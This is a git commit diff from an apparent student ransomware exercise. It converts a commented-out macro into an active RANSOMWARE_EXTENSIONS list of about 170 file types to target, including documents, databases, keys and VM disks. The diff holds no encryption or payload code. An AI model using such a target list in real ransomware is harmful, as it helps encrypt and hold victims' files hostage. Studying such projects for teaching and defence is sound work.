96401d7598197a5c258bd6aa1cd09e6d0a38568b
laird-ikar <bguyot@student.42mulhouse.fr>
2023-05-19 12:57:17 +0200

    cosntants be like "neat"

--- incs/constants.hpp
+++ incs/constants.hpp
@@ -6,7 +6,7 @@
 /*   By: bguyot <bguyot@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/05/19 10:29:08 by bguyot            #+#    #+#             */
-/*   Updated: 2023/05/19 12:49:15 by bguyot           ###   ########.fr       */
+/*   Updated: 2023/05/19 12:57:17 by bguyot           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,24 +14,22 @@
 
 #define VERSION "0.2.1"
 
-/*
-#define RANSOMWARE_EXTENSIONS \
-        ".123, .3dm, .3ds, .accdb, .ai, .aspx, .asx, .avi, \n \
-        .bak, .bmp, .brd, .bz2, .c, .cer, .cfg, .class, \n \
-        .cpp, .crt, .csr, .csv, .db, .dbf, .dch, .dif, \n \
-        .dip, .djvu, .doc, .docx, .dot, .dotx, .dwg, .eml, \n \
-        .fla, .flv, .frm, .gif, .gpg, .gz, .hwp, .ibd, \n \
-        .iso, .jar, .java, .jpeg, .jpg, .js, .jsp, .key, \n \
-        .lay, .lay6, .ldf, .m3u, .m4u, .max, .mdb, .mdf, \n \
-        .mid, .mkv, .mov, .mp3, .mp4, .mpeg, .mpg, .ms11, \n \
-        .msi, .myd, .myi, .nef, .note, .odb, .odg, .odp, \n \
-        .ods, .odt, .onetoc2, .ost, .otg, .otp, .ots, .ott, \n \
-        .p12, .p7b, .p7c, .pdf, .pem, .php, .pl, .png, \n \
-        .pot, .potx, .pps, .ppsx, .ppt, .pptx, .psd, .rar, \n \
-        .raw, .rtf, .sch, .sldm, .sldx, .slk, .sql, .sqlite3, \n \
-        .svg, .swf, .sxc, .sxd, .sxi, .sxm, .sxw, .tar, .tbk, \n \
-        .tgz, .tif, .tiff, .txt, .uop, .uot, .vbs, .vcd, \n \
-        .vdi, .vmdk, .vmx, .vmxf, .vsd, .wav, .wb2, .wk1, \n \
-        .wks, .wma, .wmv, .wpd, .wps, .xlc, .xlm, .xls, .xlsx, \n \
-        .xlt, .xltx, .xlw, .xml, .zip"
-*/
+#define RANSOMWARE_EXTENSIONS 													\
+        ".123", ".3dm", ".3ds", ".accdb", ".ai", ".aspx", ".asx", ".avi", 		\
+        ".bak", ".bmp", ".brd", ".bz2", ".c", ".cer", ".cfg", ".class", 		\
+        ".cpp", ".crt", ".csr", ".csv", ".db", ".dbf", ".dch", ".dif", 			\
+        ".dip", ".djvu", ".doc", ".docx", ".dot", ".dotx", ".dwg", ".eml", 		\
+        ".fla", ".flv", ".frm", ".gif", ".gpg", ".gz", ".hwp", ".ibd", 			\
+        ".iso", ".jar", ".java", ".jpeg", ".jpg", ".js", ".jsp", ".key", 		\
+        ".lay", ".lay6", ".ldf", ".m3u", ".m4u", ".max", ".mdb", ".mdf", 		\
+        ".mid", ".mkv", ".mov", ".mp3", ".mp4", ".mpeg", ".mpg", ".ms11", 		\
+        ".msi", ".myd", ".myi", ".nef", ".note", ".odb", ".odg", ".odp", 		\
+        ".ods", ".odt", ".onetoc2", ".ost", ".otg", ".otp", ".ots", ".ott", 	\
+        ".p12", ".p7b", ".p7c", ".pdf", ".pem", ".php", ".pl", ".png", 			\
+        ".pot", ".potx", ".pps", ".ppsx", ".ppt", ".pptx", ".psd", ".rar", 		\
+        ".raw", ".rtf", ".sch", ".sldm", ".sldx", ".slk", ".sql", ".sqlite3", 	\
+        ".svg", ".swf", ".sxc", ".sxd", ".sxi", ".sxm", ".sxw", ".tar", ".tbk", \
+        ".tgz", ".tif", ".tiff", ".txt", ".uop", ".uot", ".vbs", ".vcd", 		\
+        ".vdi", ".vmdk", ".vmx", ".vmxf", ".vsd", ".wav", ".wb2", ".wk1", 		\
+        ".wks", ".wma", ".wmv", ".wpd", ".wps", ".xlc", ".xlm", ".xls", ".xlsx",\
+        ".xlt", ".xltx", ".xlw", ".xml", ".zip"
